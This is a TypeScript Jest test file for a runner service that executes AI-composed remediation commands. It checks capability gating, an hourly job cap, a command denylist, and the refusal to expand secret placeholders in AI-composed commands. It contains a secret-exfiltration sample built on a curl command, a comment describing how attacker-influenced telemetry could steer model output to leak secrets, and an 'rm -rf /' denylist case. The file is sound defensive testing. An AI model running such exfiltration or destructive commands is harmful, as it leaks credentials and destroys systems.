import logger from "Common/Server/Utils/Logger";
import RunnerService from "Common/Server/Services/RunnerService";
import RunnerJobService, {
  MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR,
} from "Common/Server/Services/RunnerJobService";
import Runner from "Common/Models/DatabaseModels/Runner";
import RunnerJob from "Common/Models/DatabaseModels/RunnerJob";
import RunbookStepType from "Common/Types/Runbook/RunbookStepType";
import RunnerJobOrigin from "Common/Types/Runbook/RunnerJobOrigin";
import RunnerJobStatus from "Common/Types/Runbook/RunnerJobStatus";
import BadDataException from "Common/Types/Exception/BadDataException";
import {
  ExpressRequest,
  ExpressResponse,
  NextFunction,
} from "Common/Server/Utils/Express";
import Response from "Common/Server/Utils/Response";
import Dictionary from "Common/Types/Dictionary";
import { JSONObject } from "Common/Types/JSON";
import ObjectID from "Common/Types/ObjectID";
import PositiveNumber from "Common/Types/PositiveNumber";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test,
} from "@jest/globals";

/*
 * ---------------------------------------------------------------------------
 * Contract under test — the two chokepoints AI-composed commands must pass:
 *
 *   1. The agent ingress. canRunAiCommands is the per-Runner operator consent
 *      for executing AI-composed commands. The heartbeat must report it
 *      (opt-in: only an explicit `true` grants), and /claim-next-job must map
 *      the Runner's capabilities to the job origins it may lease:
 *      canRunRunbooks (default ON) entitles it to Runbook jobs,
 *      canRunAiCommands (default OFF) to AiRemediation jobs — independently,
 *      so revoking one capability never starves the other's work. With no
 *      capabilities left, the ingress answers { job: null } WITHOUT touching
 *      RunnerJobService, so a fully revoked Runner can never lease anything.
 *      The claim response carries the job's origin, omits runbookExecutionId
 *      for AiRemediation jobs (they have none), and still resolves SSH
 *      credentials at claim time exactly like runbook jobs. It must ALSO
 *      never expand {{runbookSecrets.*}} placeholders in an AI-composed
 *      command — that substitution is for human-authored runbook scripts
 *      only, and doing it for AiRemediation jobs would be an exfiltration
 *      primitive.
 *
 *   2. RunnerJobService.enqueueAiCommand — the server-side gate on the path
 *      an LLM's output takes to a shell. It must re-validate what the tool
 *      layer already checked (step type, non-empty command, the hard
 *      denylist, SSH credential requirement), enforce the project-wide
 *      hourly ceiling on AI command jobs, and persist the job in the
 *      same layout the runbook executors use: Bash carries the command as
 *      the script; SSH carries an empty script plus a structured payload,
 *      never credential material.
 * ---------------------------------------------------------------------------
 */

const ONE_HOUR_IN_MS: number = 60 * 60 * 1000;

/*
 * The shape TypeORM's Raw() find-operator exposes — what
 * QueryHelper.greaterThan builds. Declared structurally so the assertion
 * does not have to reach into TypeORM's types.
 */
type RawQueryFilter = {
  type: string;
  getSql?: ((alias: string) => string) | undefined;
  objectLiteralParameters?: Record<string, unknown> | undefined;
};

type RouterFunction = (
  req: ExpressRequest,
  res: ExpressResponse,
  next: NextFunction,
) => void | Promise<void>;

type MockRoute = {
  method: string;
  uri: string;
  middleware: RouterFunction;
  handlerFunction: RouterFunction;
};

type MockRouter = {
  get: jest.Mock;
  post: jest.Mock;
  put: jest.Mock;
  delete: jest.Mock;
};

const mockRoutes: Array<MockRoute> = [];

type RegisterRouteFunction = (
  method: string,
) => (
  uri: string,
  middleware: RouterFunction,
  handlerFunction: RouterFunction,
) => void;

const registerRoute: RegisterRouteFunction = (method: string) => {
  return (
    uri: string,
    middleware: RouterFunction,
    handlerFunction: RouterFunction,
  ): void => {
    mockRoutes.push({
      method: method.toUpperCase(),
      uri,
      middleware,
      handlerFunction,
    });
  };
};

const mockRouter: MockRouter = {
  get: jest.fn().mockImplementation(registerRoute("get")),
  post: jest.fn().mockImplementation(registerRoute("post")),
  put: jest.fn().mockImplementation(registerRoute("put")),
  delete: jest.fn().mockImplementation(registerRoute("delete")),
};

jest.mock("Common/Server/Utils/Express", () => {
  const actual: Record<string, unknown> = jest.requireActual(
    "Common/Server/Utils/Express",
  ) as Record<string, unknown>;

  return {
    ...actual,
    __esModule: true,
    default: {
      ...((actual["default"] as Record<string, unknown>) || {}),
      getRouter: (): MockRouter => {
        return mockRouter;
      },
    },
  };
});

jest.mock("Common/Server/Utils/Response", () => {
  return {
    __esModule: true,
    default: {
      sendJsonObjectResponse: jest.fn(),
      sendErrorResponse: jest.fn(),
      sendEmptySuccessResponse: jest.fn(),
      sendEntityResponse: jest.fn(),
    },
  };
});

/*
 * The secrets util imports VMUtil -> isolated-vm, a native binding that is
 * not installed for this suite (and not under test). Claiming a Bash job
 * reaches populateInScript, so both functions get real-ish implementations
 * in beforeEach (no secrets, script passes through untouched).
 */
jest.mock("../../FeatureSet/Runbook/Utils/Secrets", () => {
  return {
    __esModule: true,
    default: {
      loadForAgent: jest.fn(),
      populateInScript: jest.fn(),
    },
  };
});

/*
 * Credential resolution is a DB read scoped to the claiming Runner; mocked
 * at the module boundary so the SSH claim test controls exactly what the
 * ingress hands back on the wire.
 */
jest.mock("../../FeatureSet/Runbook/Utils/Credentials", () => {
  return {
    __esModule: true,
    default: {
      resolveForJob: jest.fn(),
    },
  };
});

// Import AFTER the jest.mock calls above (they are hoisted by jest).
import RunnerIngressAPI from "../../FeatureSet/Runbook/API/RunnerIngress";
import { RunnerExpressRequest } from "../../FeatureSet/Runbook/Types/Request";
import RunbookSecretsUtil from "../../FeatureSet/Runbook/Utils/Secrets";
import RunbookCredentialsUtil from "../../FeatureSet/Runbook/Utils/Credentials";

const HEARTBEAT_ROUTE: string = "/heartbeat";
const CLAIM_ROUTE: string = "/claim-next-job";

const PROJECT_ID: ObjectID = new ObjectID(
  "22222222-2222-4222-8222-222222222222",
);
const AI_RUN_ID: ObjectID = new ObjectID(
  "33333333-3333-4333-8333-333333333333",
);
const SUGGESTION_ID: ObjectID = new ObjectID(
  "44444444-4444-4444-8444-444444444444",
);
const TARGET_AGENT_ID: ObjectID = new ObjectID(
  "55555555-5555-4555-8555-555555555555",
);
const JOB_ID: ObjectID = new ObjectID("66666666-6666-4666-8666-666666666666");

/*
 * A script that LOOKS harmless on an approval card but expands to plaintext
 * if the ingress ever runs secret substitution over it.
 */
const SECRET_PLACEHOLDER_SCRIPT: string =
  "curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://internal.example.com/api";

type RouteCallResult = {
  thrownToNext: unknown;
  nextCallCount: number;
};

function matchRoute(method: string, uri: string): MockRoute {
  const route: MockRoute | undefined = mockRoutes.find((route: MockRoute) => {
    return route.method === method.toUpperCase() && route.uri === uri;
  });

  if (!route) {
    throw new Error(`Route ${method} ${uri} was never registered`);
  }

  return route;
}

/*
 * The ingress handlers read req.runner, which the auth middleware
 * (RunnerAuthorization.isAuthorizedAgent) sets from the row it loaded.
 * The middleware is not under test here, so the request is constructed with
 * the property already populated — exactly what the handler receives.
 */
async function callRoute(data: {
  uri: string;
  agent?: Runner | undefined;
  body?: JSONObject | undefined;
}): Promise<RouteCallResult> {
  const req: RunnerExpressRequest = {
    params: {} as Dictionary<string>,
    query: {},
    body: data.body || {},
    headers: {},
    runner: data.agent,
  } as unknown as RunnerExpressRequest;

  const res: ExpressResponse = {
    send: jest.fn(),
    json: jest.fn(),
    status: jest.fn().mockReturnThis(),
  } as unknown as ExpressResponse;

  const next: jest.Mock = jest.fn();

  await matchRoute("POST", data.uri).handlerFunction(
    req,
    res,
    next as unknown as NextFunction,
  );

  return {
    thrownToNext: next.mock.calls[0] ? next.mock.calls[0][0] : undefined,
    nextCallCount: next.mock.calls.length,
  };
}

function lastJsonResponse(): JSONObject {
  const calls: Array<Array<unknown>> = (
    Response.sendJsonObjectResponse as unknown as jest.Mock
  ).mock.calls as Array<Array<unknown>>;

  expect(calls.length).toBeGreaterThan(0);

  return calls[calls.length - 1]![2] as JSONObject;
}

describe("AI command capability gating on the agent ingress", () => {
  let agentId: ObjectID;
  let projectId: ObjectID;

  let claimNextJobSpy: jest.SpyInstance;

  /*
   * Fake row as the auth middleware would hand it over. Capability columns
   * are only present when explicitly given, so `undefined` here is exactly
   * the pre-migration / unselected-column case.
   */
  function buildAgent(data: {
    canRunRunbooks?: boolean | undefined;
    canRunCodeFixTasks?: boolean | undefined;
    canRunAiCommands?: boolean | undefined;
  }): Runner {
    return {
      id: agentId,
      projectId: projectId,
      name: "test-runner",
      ...(data.canRunRunbooks !== undefined
        ? { canRunRunbooks: data.canRunRunbooks }
        : {}),
      ...(data.canRunCodeFixTasks !== undefined
        ? { canRunCodeFixTasks: data.canRunCodeFixTasks }
        : {}),
      ...(data.canRunAiCommands !== undefined
        ? { canRunAiCommands: data.canRunAiCommands }
        : {}),
    } as unknown as Runner;
  }

  function buildClaimedJob(data: {
    origin: RunnerJobOrigin;
    stepType: RunbookStepType;
    script: string;
    runbookExecutionId?: ObjectID | undefined;
    payload?: JSONObject | undefined;
  }): RunnerJob {
    return {
      id: JOB_ID,
      ...(data.runbookExecutionId
        ? { runbookExecutionId: data.runbookExecutionId }
        : {}),
      origin: data.origin,
      stepId: "cmd-1",
      stepType: data.stepType,
      script: data.script,
      timeoutInMs: 60_000,
      leaseExpiresAt: new Date("2026-08-04T00:00:30.000Z"),
      ...(data.payload ? { payload: data.payload } : {}),
    } as unknown as RunnerJob;
  }

  function claimedOrigins(callIndex: number): Array<RunnerJobOrigin> {
    const claimArgs: { allowedOrigins: Array<RunnerJobOrigin> } =
      claimNextJobSpy.mock.calls[callIndex]![0] as {
        allowedOrigins: Array<RunnerJobOrigin>;
      };

    return claimArgs.allowedOrigins;
  }

  beforeAll(() => {
    mockRoutes.length = 0;
    new RunnerIngressAPI();
  });

  beforeEach(() => {
    jest.clearAllMocks();

    agentId = ObjectID.generate();
    projectId = ObjectID.generate();

    jest.spyOn(RunnerService, "heartbeat").mockResolvedValue(undefined);
    claimNextJobSpy = jest
      .spyOn(RunnerJobService, "claimNextJob")
      .mockResolvedValue(null);

    (RunbookSecretsUtil.loadForAgent as unknown as jest.Mock).mockResolvedValue(
      [],
    );
    (
      RunbookSecretsUtil.populateInScript as unknown as jest.Mock
    ).mockImplementation((data: { script: string }): string => {
      return data.script;
    });
    (
      RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
    ).mockResolvedValue(null);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe("POST /heartbeat reports canRunAiCommands", () => {
    /*
     * Opt-in semantics: only an explicit `true` on the row grants the AI
     * command capability — undefined (pre-migration row / unselected
     * column) must read as OFF, unlike canRunRunbooks which defaults ON.
     */
    test("reports canRunAiCommands true only when the row grants it, alongside the other two capabilities", async () => {
      const result: RouteCallResult = await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: false,
          canRunAiCommands: true,
        },
      });
    });

    test("reports canRunAiCommands false when the column is undefined (opt-in default)", async () => {
      await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({}),
      });

      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: false,
          canRunAiCommands: false,
        },
      });
    });

    test("reports canRunAiCommands false when the row explicitly revokes it", async () => {
      await callRoute({
        uri: HEARTBEAT_ROUTE,
        agent: buildAgent({
          canRunRunbooks: true,
          canRunCodeFixTasks: true,
          canRunAiCommands: false,
        }),
      });

      expect(lastJsonResponse()).toEqual({
        status: "ok",
        capabilities: {
          canRunRunbooks: true,
          canRunCodeFixTasks: true,
          canRunAiCommands: false,
        },
      });
    });
  });

  describe("POST /claim-next-job maps capabilities to allowed job origins", () => {
    test("asks for both origins when both capabilities are on", async () => {
      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true, canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([
        RunnerJobOrigin.Runbook,
        RunnerJobOrigin.AiRemediation,
      ]);
    });

    /*
     * The independence guarantee: revoking runbooks must not starve AI
     * command work. The Runner is still served an AiRemediation job.
     */
    test("serves an AiRemediation job to a runbook-revoked Runner with canRunAiCommands on", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: "systemctl restart nginx",
        }),
      );

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: false, canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([RunnerJobOrigin.AiRemediation]);

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
      expect(job["jobId"]).toBe(JOB_ID.toString());
    });

    test("asks for runbook jobs only when canRunAiCommands is off", async () => {
      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true, canRunAiCommands: false }),
      });

      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([RunnerJobOrigin.Runbook]);
    });

    test("asks for runbook jobs only when canRunAiCommands is undefined (opt-in default)", async () => {
      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      expect(claimNextJobSpy).toHaveBeenCalledTimes(1);
      expect(claimedOrigins(0)).toEqual([RunnerJobOrigin.Runbook]);
    });

    /*
     * The load-bearing assertion: with every capability revoked,
     * claimNextJob is NEVER called — the fully revoked Runner is answered
     * "no work for you", not an error, and can never lease anything.
     */
    test("answers { job: null } without touching the job service when both capabilities are off", async () => {
      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: false, canRunAiCommands: false }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(claimNextJobSpy).not.toHaveBeenCalled();
      expect(lastJsonResponse()).toEqual({ job: null });
    });
  });

  describe("POST /claim-next-job response shape for AiRemediation jobs", () => {
    test("includes the job's origin and omits runbookExecutionId when the job has none", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: "systemctl restart nginx",
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect(job).not.toHaveProperty("runbookExecutionId");
      expect(job["jobId"]).toBe(JOB_ID.toString());
      expect(job["script"]).toBe("systemctl restart nginx");
    });

    test("still includes runbookExecutionId and a Runbook origin for runbook jobs", async () => {
      const executionId: ObjectID = ObjectID.generate();

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.Runbook,
          stepType: RunbookStepType.Bash,
          script: "echo hello",
          runbookExecutionId: executionId,
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.Runbook);
      expect(job["runbookExecutionId"]).toBe(executionId.toString());
    });

    /*
     * SSH AI jobs reuse the runbook credential machinery: the payload rides
     * through to the Runner untouched, and the credential referenced by
     * payload.credentialId is resolved at claim time, scoped to the
     * claiming Runner and its project — never stored on the job row.
     */
    test("passes the SSH payload through and resolves the credential for the claiming Runner", async () => {
      const credentialId: string = ObjectID.generate().toString();
      const resolvedCredential: JSONObject = {
        host: "10.0.0.5",
        port: 22,
        username: "deploy",
        privateKey: "ssh-key-material",
      };

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.SSH,
          script: "",
          payload: {
            credentialId: credentialId,
            command: "systemctl restart nginx",
          },
        }),
      );
      (
        RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
      ).mockResolvedValue(resolvedCredential);

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);

      const resolveCall: {
        credentialId: string;
        agentId: ObjectID;
        projectId: ObjectID;
      } = (RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock).mock
        .calls[0]![0] as {
        credentialId: string;
        agentId: ObjectID;
        projectId: ObjectID;
      };

      expect(resolveCall.credentialId).toBe(credentialId);
      expect(resolveCall.agentId.toString()).toBe(agentId.toString());
      expect(resolveCall.projectId.toString()).toBe(projectId.toString());

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect(job).not.toHaveProperty("runbookExecutionId");
      expect(job["stepType"]).toBe(RunbookStepType.SSH);
      expect(job["payload"]).toEqual({
        credentialId: credentialId,
        command: "systemctl restart nginx",
      });
      expect(job["credential"]).toEqual(resolvedCredential);
    });
  });

  /*
   * The exfiltration fix.
   *
   * {{runbookSecrets.NAME}} expansion exists for RUNBOOK scripts, every one
   * of which a human authored. An AI-composed command is model output shaped
   * by telemetry an attacker can influence, and it is reviewed as literal
   * text on the approval card. If the ingress expanded placeholders there,
   * `curl -u admin:{{runbookSecrets.PROD_PASSWORD}} https://attacker...`
   * would read as harmless on the card and arrive at the shell holding the
   * plaintext secret — a one-line exfiltration macro that also lands in the
   * job's captured output. So the placeholder must be served through
   * VERBATIM for AiRemediation jobs, and the secrets util must not even be
   * consulted (nothing to leak if nothing is loaded). AI commands reach
   * credentials only via the credentialId path, which never exposes the
   * material to the model.
   */
  describe("POST /claim-next-job never substitutes secrets into AI-composed commands", () => {
    test("serves an AiRemediation script with its {{runbookSecrets.*}} placeholder intact and never calls the secrets util", async () => {
      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.Bash,
          script: SECRET_PLACEHOLDER_SCRIPT,
        }),
      );

      const result: RouteCallResult = await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(result.nextCallCount).toBe(0);
      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["script"]).toBe(SECRET_PLACEHOLDER_SCRIPT);
      expect(job["script"]).toContain("{{runbookSecrets.PROD_PASSWORD}}");
      expect(job["script"]).not.toContain("hunter2");
    });

    /*
     * Same guarantee for the SSH shape, where the command rides in the
     * payload instead of the script: the payload is passed through as-is
     * and the secrets util is still never consulted.
     */
    test("passes an AiRemediation SSH payload command through with its placeholder intact", async () => {
      const credentialId: string = ObjectID.generate().toString();

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.AiRemediation,
          stepType: RunbookStepType.SSH,
          script: "",
          payload: {
            credentialId: credentialId,
            command: SECRET_PLACEHOLDER_SCRIPT,
          },
        }),
      );
      (
        RunbookCredentialsUtil.resolveForJob as unknown as jest.Mock
      ).mockResolvedValue({ host: "10.0.0.5", username: "deploy" });

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunAiCommands: true }),
      });

      expect(RunbookSecretsUtil.loadForAgent).not.toHaveBeenCalled();
      expect(RunbookSecretsUtil.populateInScript).not.toHaveBeenCalled();

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;
      const payload: JSONObject = job["payload"] as JSONObject;

      expect(payload["command"]).toBe(SECRET_PLACEHOLDER_SCRIPT);
    });

    /*
     * The other half of the fix: runbook scripts must still get their
     * secrets. The identical script, served to a Runbook-origin job, IS
     * substituted — proving the skip is keyed on the job's origin and not
     * on something that would quietly break runbooks.
     */
    test("still substitutes secrets for a Runbook-origin job carrying the same script", async () => {
      const substituted: string =
        "curl -u admin:hunter2 https://internal.example.com/api";
      const secrets: Array<unknown> = [{ name: "PROD_PASSWORD" }];

      (
        RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
      ).mockResolvedValue(secrets);
      (
        RunbookSecretsUtil.populateInScript as unknown as jest.Mock
      ).mockReturnValue(substituted);

      claimNextJobSpy.mockResolvedValue(
        buildClaimedJob({
          origin: RunnerJobOrigin.Runbook,
          stepType: RunbookStepType.Bash,
          script: SECRET_PLACEHOLDER_SCRIPT,
          runbookExecutionId: ObjectID.generate(),
        }),
      );

      await callRoute({
        uri: CLAIM_ROUTE,
        agent: buildAgent({ canRunRunbooks: true }),
      });

      expect(RunbookSecretsUtil.loadForAgent).toHaveBeenCalledTimes(1);
      expect(
        (
          RunbookSecretsUtil.loadForAgent as unknown as jest.Mock
        ).mock.calls[0]![0]!.toString(),
      ).toBe(agentId.toString());

      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledTimes(1);
      expect(RunbookSecretsUtil.populateInScript).toHaveBeenCalledWith({
        script: SECRET_PLACEHOLDER_SCRIPT,
        secrets: secrets,
      });

      const job: JSONObject = lastJsonResponse()["job"] as JSONObject;

      expect(job["script"]).toBe(substituted);
    });
  });
});

describe("RunnerJobService.enqueueAiCommand", () => {
  let createSpy: jest.SpyInstance;
  let countBySpy: jest.SpyInstance;

  function enqueueData(
    overrides: Partial<Record<string, unknown>> = {},
  ): Parameters<typeof RunnerJobService.enqueueAiCommand>[0] {
    return {
      projectId: PROJECT_ID,
      aiRunId: AI_RUN_ID,
      autoRemediationSuggestionId: SUGGESTION_ID,
      stepId: "cmd-1",
      stepType: RunbookStepType.Bash,
      targetAgentId: TARGET_AGENT_ID,
      command: "systemctl restart nginx",
      timeoutInMs: 60_000,
      ...overrides,
    } as Parameters<typeof RunnerJobService.enqueueAiCommand>[0];
  }

  function createdRow(): RunnerJob {
    expect(createSpy).toHaveBeenCalledTimes(1);

    const createArgs: { data: RunnerJob } = createSpy.mock.calls[0]![0] as {
      data: RunnerJob;
    };

    return createArgs.data;
  }

  beforeEach(() => {
    /*
     * The rejection tests throw through @CaptureSpan, which records the
     * exception at error level — expected here, so keep the output clean.
     */
    jest.spyOn(logger, "error").mockImplementation((): void => {
      return undefined;
    });

    createSpy = jest
      .spyOn(RunnerJobService, "create")
      .mockImplementation((args: { data: RunnerJob }): Promise<RunnerJob> => {
        return Promise.resolve(args.data);
      });

    /*
     * Every enqueue now reads the project's hourly AI command usage before
     * it writes. Default the count to zero so the tests that are about
     * something else see an empty hour.
     */
    countBySpy = jest
      .spyOn(RunnerJobService, "countBy")
      .mockResolvedValue(new PositiveNumber(0));
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  test("rejects the Kubernetes step type — AI remediation only composes Bash and SSH", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.Kubernetes }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects the JavaScript step type", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.JavaScript }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects an empty (or whitespace-only) command", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(enqueueData({ command: "   " })),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  /*
   * The hard denylist holds even here: this path is reached AFTER human
   * approval of a command plan, and approval must never override it.
   */
  test("rejects a denylisted command even though the tool layer already checked it", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(enqueueData({ command: "rm -rf /" })),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("rejects an SSH command without a credentialId", async () => {
    await expect(
      RunnerJobService.enqueueAiCommand(
        enqueueData({ stepType: RunbookStepType.SSH }),
      ),
    ).rejects.toThrow(BadDataException);

    expect(createSpy).not.toHaveBeenCalled();
  });

  test("persists a Bash job with the command as the script, AiRemediation provenance, and no payload", async () => {
    await RunnerJobService.enqueueAiCommand(enqueueData({}));

    const row: RunnerJob = createdRow();

    expect(row.script).toBe("systemctl restart nginx");
    expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
    expect(row.aiRunId?.toString()).toBe(AI_RUN_ID.toString());
    expect(row.autoRemediationSuggestionId?.toString()).toBe(
      SUGGESTION_ID.toString(),
    );
    expect(row.payload).toBeUndefined();
    expect(row.runbookExecutionId).toBeUndefined();
    expect(row.projectId?.toString()).toBe(PROJECT_ID.toString());
    expect(row.targetAgentId?.toString()).toBe(TARGET_AGENT_ID.toString());
    expect(row.stepType).toBe(RunbookStepType.Bash);
    expect(row.timeoutInMs).toBe(60_000);
    expect(row.status).toBe(RunnerJobStatus.Pending);

    const createArgs: { props: Record<string, unknown> } = createSpy.mock
      .calls[0]![0] as { props: Record<string, unknown> };

    expect(createArgs.props).toEqual(expect.objectContaining({ isRoot: true }));
  });

  test("persists an SSH job with an empty script and the structured payload — never credential material", async () => {
    const credentialId: string = ObjectID.generate().toString();

    await RunnerJobService.enqueueAiCommand(
      enqueueData({
        stepType: RunbookStepType.SSH,
        credentialId: credentialId,
        command: "systemctl restart nginx",
      }),
    );

    const row: RunnerJob = createdRow();

    expect(row.script).toBe("");
    expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
    expect(row.stepType).toBe(RunbookStepType.SSH);
    expect(row.payload).toEqual({
      credentialId: credentialId,
      command: "systemctl restart nginx",
    });
  });

  test("honors claimTimeoutInMs when stamping the claim deadline", async () => {
    const claimTimeoutInMs: number = 300_000;
    const before: number = Date.now();

    await RunnerJobService.enqueueAiCommand(
      enqueueData({ claimTimeoutInMs: claimTimeoutInMs }),
    );

    const after: number = Date.now();
    const row: RunnerJob = createdRow();
    const deadlineMs: number = row.claimDeadlineAt!.getTime();

    // ceil(300000 / 1000) = exactly 300 seconds past "now" at enqueue time.
    expect(deadlineMs).toBeGreaterThanOrEqual(before + claimTimeoutInMs);
    expect(deadlineMs).toBeLessThanOrEqual(after + claimTimeoutInMs);
  });

  /*
   * The project-wide hourly storm brake. It lives at this single enqueue
   * chokepoint (rather than in the FullAuto inline tool it used to sit in)
   * so it also bounds the approved-plan and rollback paths — every route
   * from an LLM to a shell passes through here, and all of them share one
   * budget. Check-then-act, so it is a brake and not an exact quota.
   */
  describe("the project-wide hourly cap on AI command jobs", () => {
    test("rejects and creates nothing once the project is at the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR),
      );

      await expect(
        RunnerJobService.enqueueAiCommand(enqueueData({})),
      ).rejects.toThrow(BadDataException);

      expect(createSpy).not.toHaveBeenCalled();
    });

    test("rejects and creates nothing when the project is already over the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR + 7),
      );

      await expect(
        RunnerJobService.enqueueAiCommand(enqueueData({})),
      ).rejects.toThrow(BadDataException);

      expect(createSpy).not.toHaveBeenCalled();
    });

    test("proceeds at one below the cap", async () => {
      countBySpy.mockResolvedValue(
        new PositiveNumber(MAX_AI_COMMAND_JOBS_PER_PROJECT_PER_HOUR - 1),
      );

      await RunnerJobService.enqueueAiCommand(enqueueData({}));

      const row: RunnerJob = createdRow();

      expect(row.origin).toBe(RunnerJobOrigin.AiRemediation);
      expect(row.script).toBe("systemctl restart nginx");
    });

    /*
     * The cap must count this project's AI command jobs from the last hour
     * — not another project's, not runbook jobs (which have their own
     * limits), and not all of history.
     */
    test("counts only this project's AiRemediation jobs created in the last hour", async () => {
      const before: Date = new Date();

      await RunnerJobService.enqueueAiCommand(enqueueData({}));

      const after: Date = new Date();

      expect(countBySpy).toHaveBeenCalledTimes(1);

      const countByArgs: {
        query: Record<string, unknown>;
        props: Record<string, unknown>;
      } = countBySpy.mock.calls[0]![0] as {
        query: Record<string, unknown>;
        props: Record<string, unknown>;
      };

      expect(countByArgs.query["origin"]).toBe(RunnerJobOrigin.AiRemediation);
      expect((countByArgs.query["projectId"] as ObjectID).toString()).toBe(
        PROJECT_ID.toString(),
      );
      expect(countByArgs.props).toEqual(
        expect.objectContaining({ isRoot: true }),
      );

      const createdAtFilter: RawQueryFilter = countByArgs.query[
        "createdAt"
      ] as unknown as RawQueryFilter;

      expect(createdAtFilter).toBeDefined();
      expect(createdAtFilter.type).toBe("raw");
      expect(createdAtFilter.getSql!("createdAt")).toContain(">");

      const boundaries: Array<unknown> = Object.values(
        createdAtFilter.objectLiteralParameters || {},
      );

      expect(boundaries).toHaveLength(1);

      const boundary: Date = boundaries[0] as Date;

      expect(boundary).toBeInstanceOf(Date);
      // One hour back from "now", give or take the test's own runtime.
      expect(boundary.getTime()).toBeGreaterThanOrEqual(
        before.getTime() - ONE_HOUR_IN_MS - 1000,
      );
      expect(boundary.getTime()).toBeLessThanOrEqual(
        after.getTime() - ONE_HOUR_IN_MS + 1000,
      );
    });
  });
});
